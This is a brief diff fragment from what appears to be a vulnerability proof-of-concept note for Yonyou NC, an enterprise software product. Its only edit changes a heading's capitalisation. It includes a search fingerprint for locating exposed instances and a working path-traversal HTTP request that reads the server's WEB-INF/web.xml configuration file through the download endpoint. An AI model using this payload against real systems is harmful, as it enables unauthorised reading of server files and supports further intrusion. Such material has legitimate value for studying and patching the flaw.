@@ -8,7 +8,7 @@
 title=="YONYOU NC"
 ```
 
-## poc
+## POC
 
 ```
 GET /portal/pt/downCourseWare/download?fileName=../webapps/nc_web/WEB-INF/web.xml&pageId=login  HTTP/1.1
